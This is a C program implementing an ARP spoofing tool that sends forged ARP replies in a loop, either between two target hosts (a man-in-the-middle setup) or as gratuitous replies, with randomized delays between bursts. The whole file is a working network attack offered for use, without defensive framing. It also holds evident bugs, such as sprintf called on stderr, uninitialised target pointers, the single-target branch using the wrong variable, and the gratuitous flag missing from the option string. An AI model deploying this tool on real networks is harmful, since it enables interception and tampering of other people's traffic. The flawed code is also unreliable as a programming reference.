#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <getopt.h>

const char * help_msg = "help message\n-g - gratuitous\n -t - target, etc";

bool arp_reply(int fd, const char * interface, const char * src_ip, const char * target_ip) { 
	struct sockaddr_ll sll = {0};
	struct ether_arp arpf = {0};
	static struct ifreq ifrq = {0};
	const uint8_t zero_mac[6] = {0};
	
	if(!memcmp(ifrq.ifr_hwaddr.sa_data, zero_mac, 6)) {
		ifrq.ifr_addr.sa_family = AF_INET;
		strncpy(ifrq.ifr_name, interface, IFNAMSIZ - 1);

		if(ioctl(fd, SIOCGIFHWADDR, &ifrq) < 0) {
			fprintf(stderr, "Error: unable to call ioctl: %s", strerror(errno));
			close(fd);
			return 1;
		}

	}
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ARP);
	sll.sll_ifindex = if_nametoindex(interface);
	sll.sll_halen = ETH_ALEN;
	memset(sll.sll_addr, 0xFF, ETH_ALEN);	

	memcpy(arpf.arp_sha, ifrq.ifr_hwaddr.sa_data, ETH_ALEN);
	inet_pton(AF_INET, src_ip, arpf.arp_spa);			
	inet_pton(AF_INET, target_ip, arpf.arp_tpa);
	arpf.arp_hrd = htons(ARPHRD_ETHER);
	arpf.arp_pro = htons(ETH_P_IP);
	arpf.arp_hln = 6;
	arpf.arp_pln = 4;
	arpf.arp_op = htons(ARPOP_REPLY);

	if(sendto(fd, &arpf, sizeof(arpf), 0,(const struct sockaddr *)&sll, sizeof(arpf)) <= 0){
		fprintf(stderr, "Error: unable to call sendto: %s", strerror(errno));
		return 1;
	}
	else {
		return 0;
	}
}


int main (int argc, char * argv[]) {	
	int opt;
	
	int rand_min = 100;
	int rand_max = 500;

	char * target_a;
	char * target_b;
	char * target;
	char * interface;
	
	bool is_dual_target;
	bool is_gratuitous;
	struct in_addr tmp;

	for (;;) {
		static struct option long_opts[] = {
			{"help", no_argument, 0, 'h'},
			{"target-a", required_argument, 0, 'a'},
			{"target-b", required_argument, 0, 'b'},
			{"dual-target", no_argument, 0, 'd'},
			{"target", required_argument, 0, 't'},
			{"gratuitous", no_argument, 0, 'g'},
			{"interface", required_argument, 0, 'i'},
			{"rand-min", required_argument, 0, 'm'},
			{"rand-max", required_argument, 0, 'M'},
			{0, 0, 0, 0}
		};
		opt = getopt_long(argc, argv, "hda:b:t:i:m:M:", long_opts, &opt);
		
		if(opt == -1)
			break;
		
		switch(opt) {
			case 'h':
				fprintf(stderr, "%s", help_msg);
				return 0;
			case 'a':
				target_a = optarg;
				if(inet_pton(AF_INET, optarg, &tmp) != 1) {			
					fprintf(stderr, "Target A IP address is invalid\n");
					return 1;
				}
				break;
			case 'b':
				target_b = optarg;
				if(inet_pton(AF_INET, optarg, &tmp) != 1) {
					fprintf(stderr, "Target B IP address is invalid\n");
					return 1;
				}			
				break;
			case 'd':
				is_dual_target = 1;
				break;
			case 't':			
				target = optarg;
				if(inet_pton(AF_INET, optarg, &tmp) != 1) {
					fprintf(stderr, "Target IP is invalid\n");
					return 1;
				}
				break; 
			case 'g':
				is_gratuitous = 1;
				break;
			case 'i':
				interface = optarg;
				break;
			case 'm':
				rand_min = atoi(optarg);
				break;
			case 'M':
				rand_max = atoi(optarg);
				break;
			default:
				break;
		}
	}
	
	if(rand_min < 1) {
		fprintf(stderr, "Invalid rand_min value\n");
		return 1;
	}
	if(rand_max < 1) {
		fprintf(stderr,"Invalid rand_max value\n");
		return 1;
	}

	if((target_a == 0 || target_b == 0) && is_dual_target) {
		fprintf(stderr, "One target IP missing\n");
		return 1;
	}
	if(target == 0 && !is_dual_target) {
		fprintf(stderr, "Target IP missing\n");
		return 1;
	}
	if(interface == 0) {
		fprintf(stderr, "Interface not specified\n");
		return 1;
	}

	int fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	
	if(fd < 0) {
		fprintf(stderr, "Error: Unable to create socket: %s\n", strerror(errno));
		return 1;
	}
	
	char path[255];
	snprintf(path, sizeof(path), "/sys/class/net/%s", interface);

	if(access(path, F_OK) == -1) {
		printf("Interface %s does not exist:%s\n", interface, strerror(errno));
		return 1;
	}
	
	srandom(time(NULL));

	for(;;) {
		uint16_t delay_ms = rand_min + random() % (rand_max - rand_min);
		bool reply_a, reply_b;
		if(is_dual_target) {
			if(!is_gratuitous) {
				reply_a = arp_reply(fd, interface, target_a, target_b);
				reply_b = arp_reply(fd, interface, target_b, target_a);
				
				if(reply_a || reply_b) {
					sprintf(stderr, "Error while sending arp frames, exiting...");
					return 1;
				}

				usleep(delay_ms * 1000);
			}
			else {
				reply_a = arp_reply(fd, interface, target_a, target_a);
				reply_b = arp_reply(fd, interface, target_b, target_b);
				
				if(reply_a || reply_b) {
					sprintf(stderr, "Error while sending arp frames, exiting...");
					return 1;
				}
				usleep(delay_ms * 1000);
			}
		}
		else {
			reply_a = arp_reply(fd, interface, target_a, target_a);
			if(reply_a) {
				sprintf(stderr, "Error while sending arp frames, exiting...");
				return 1;
			}
						
			usleep(delay_ms * 1000);	
		}

	}

	close(fd);
	return 0;
}	
